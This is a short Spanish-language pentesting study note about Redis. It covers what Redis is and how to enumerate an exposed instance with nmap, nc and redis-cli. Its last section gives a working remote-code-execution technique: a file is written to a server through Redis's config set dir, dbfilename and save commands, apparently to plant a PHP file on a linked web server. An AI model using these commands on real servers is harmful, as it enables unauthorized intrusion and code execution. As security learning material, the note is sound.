----
- Tags: #teoria #practica #basico 
----

# Redis

**Redis** es un motor de base de datos en memoria, basado en el almacenamiento en trablas de hashes pero que opcionalmente puede ser usada com una base de datos durable o persistente.

Es importante tener en cuenta que redis es una base de datos NoSQL que almacena datos en uan estructura de clave-valor. La clave (key) es un identificador único que se utiliza para acceder a los datos y el valro es cualqueir tipo de dato, como cadenas, listas, conjuntos, hash maps, etc.

-----

# Enumeration 

Redis puede escanearse de manera manula o automatizada...

- ## Automatica
`
```bash
nmap --script redis-info -sV -p 6379 {ip}
```

- ## Manual 

Para conectarnos a redis podemos hacer uso de **nc** o **redis-cli**. 

```bash
nc -vn {ip} 6379

redis-cli -h {ip} # sudo apt-get install redis-tools
```

Comandos basicos para enumerar: 

```bash
INFO 
# [...Listar información en general así como de las base de datos en memoria...]
clien list 
# [...Listar los usuarios conectados...]
CONFIG GET * 
# [...Obtener las configuraciones...]
```

En caso de haber base de datos, podríamos intentar listar estas. 

```bash
SELECT {number}
# [...Seleccionar una base de datos...]
KEYS *
# [...Obtener las keys de la bade de datos...]
GET {name_of_key}
# [...Seleccionar el valor de las keys...]
```

-----

# [[RCE - (Remote Command Execution)]] vía Redis

Muchas veces una web la cual acepta php esta vinculada con redis, de maner que se nos podría ocurrir intentar depostiar un archivo especifico en una ruta en particular. 

Es **IMPORTANTE** tener en cuenta que todo archvo que subamos debe empezar con 3 saltos de linea ("\\n\\n\\n") y finalizar con 2 ("\\n\\n"). 

```bash
cat {file_to_upload} | redis-cli -h {ip} -x set {identifier_name}

redis-cli -h {ip} config set {path_to_upload_the_file}

redis-cli -h {ip} config set dbfilename "{filename}"

redis-cli -h {ip} save

```